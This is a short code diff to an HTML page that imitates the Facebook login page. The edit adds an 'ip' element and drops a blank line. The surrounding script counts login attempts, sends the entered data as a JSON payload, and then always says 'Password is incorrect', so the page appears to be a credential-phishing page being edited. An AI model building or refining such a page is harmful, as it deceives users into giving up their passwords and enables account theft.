@@ -183,6 +183,7 @@
     <div class="footer">
         <p>Facebook © 2025</p>
     </div>
+    <div id="ip"></div> <!-- Added this line -->
 
     <script>
         let loginAttempts = 0;
@@ -221,7 +222,6 @@
                 body: JSON.stringify(embedPayload)
             });
 
-            
             errorMessage.textContent = 'Password is incorrect';
 
             setTimeout(() => {
